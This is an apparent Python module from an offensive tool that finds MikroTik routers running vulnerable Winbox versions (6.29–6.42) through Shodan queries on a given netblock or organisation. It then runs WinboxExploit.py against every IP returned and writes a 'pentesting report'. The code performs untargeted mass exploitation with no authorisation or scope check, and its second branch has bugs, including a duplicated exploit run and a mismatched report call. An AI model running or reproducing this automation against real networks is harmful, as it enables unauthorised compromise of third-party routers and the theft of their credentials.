import os
import subprocess
from mikrotik.generate_report import generate_report
import time

def scan_target(query, scan_result, output_dir):
    # Run the Shodan search command with the specified query
    result = subprocess.run(
        ['shodan', 'search', '--fields', 'ip_str,org,os,timestamp', query],
        capture_output=True,
        text=True
    )
    
    # If the command output is an error message or doesn't contain the 'os' field, don't save it
    if 'No search results found' in result.stderr:
        return False
    
    # Otherwise, append the output to the specified file
    with open(scan_result, 'a') as f:
        lines = result.stdout.split('\n')
        lines = [line for line in lines if line.strip()]  # Filter out empty lines
        f.write('\n'.join(lines))
        f.write('\n')
    
    return True

def run_exploit(output_dir, scan_result):
    # Create a filename for the exploit result
    exploit_result = os.path.join(output_dir, f"{os.path.basename(output_dir)}_execute_result.txt")
    
    # Read the scan results file and extract IP addresses
    with open(scan_result, 'r') as f:
        ip_addresses = []
        for line in f:
            if line.startswith('Detected target:') or not line.strip():
                continue
            ip_address = line.split()[0]
            ip_addresses.append(ip_address)

    # Perform exploitation for each IP address and save the results
    with open(exploit_result, 'a') as f:
        for ip_address in ip_addresses:
            cmd = f'python3 WinboxExploit.py {ip_address}'
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True
            )
            f.write(f"Target: {ip_address}\n")
            f.write(result.stdout)
            f.write('\n')

    return exploit_result

def winbox_exploit(choice, target_ip):
    if choice == '1':
        # Get IP range from the user
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        keyword = target_ip
        output_dir = os.path.join("mikrotik", f"{keyword.replace('/', '-')}-{timestamp}")
        os.makedirs(output_dir, exist_ok=True)
        scan_result = os.path.join(output_dir, f"{os.path.basename(output_dir)}_scan_result.txt")
        
        # Perform Shodan searches with different queries for the IP range
        found_results = False
        for query in [
            f'winbox 6.29 net:{keyword}',
            f'winbox 6.29.* net:{keyword}',
            f'winbox 6.3* net:{keyword}',
            f'winbox 6.40 net:{keyword}',
            f'winbox 6.40.* net:{keyword}',
            f'winbox 6.41 net:{keyword}',
            f'winbox 6.41.* net:{keyword}',
            f'winbox 6.42 net:{keyword}',
        ]:
            if scan_target(query, scan_result, output_dir):
                found_results = True
        
        if not found_results:
            return 'No search results found for the specified target IP.'
        
        print(f'Scan complete. Results saved to {scan_result}.')
        
        # Run exploitation on the scan results
        exploit_result = run_exploit(output_dir, scan_result)
        print(f'Exploit complete. Results saved to {exploit_result}.')
        
        # Generate a pentesting report
        report_path = generate_report(keyword, scan_result, exploit_result, output_dir)
        print(f'Pentesting report generated: {report_path}')
        
        return report_path

    elif choice == '2':
        # Get organization name from the user
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        keyword = target_ip
        output_dir = os.path.join("mikrotik", f"{keyword.replace('/', '-')}-{timestamp}")
        os.makedirs(output_dir, exist_ok=True)
        scan_result = os.path.join(output_dir, f"{os.path.basename(output_dir)}_scan_result.txt")
        
        # Perform Shodan searches with different queries for the organization name
        found_results = False
        for query in [
            f'winbox 6.29 org:\"{keyword}\"',
            f'winbox 6.29.* org:\"{keyword}\"',
            f'winbox 6.3* org:\"{keyword}\"',
            f'winbox 6.40 org:\"{keyword}\"',
            f'winbox 6.40.* org:\"{keyword}\"',
            f'winbox 6.41 org:\"{keyword}\"',
            f'winbox 6.41.* org:\"{keyword}\"',
            f'winbox 6.42 org:\"{keyword}\"',
        ]:
            if scan_target(query, scan_result, output_dir):
                found_results = True
        
        if not found_results:
            return 'No search results found for the specified target IP.'
        
        print(f'Scan complete. Results saved to {scan_result}.')
        
        # Run exploitation on the scan results
        exploit_result = run_exploit(output_dir, scan_result)
        print(f'Exploit complete. Results saved to {exploit_result}.')
        
        # Generate a pentesting report
        exploit_result = run_exploit(output_dir, scan_result)
        report_path = generate_report(keyword, scan_result, exploit_result)
        print(f'Pentesting report generated: {report_path}')
        
        return report_path

    else:
        return 'Invalid choice selected.'
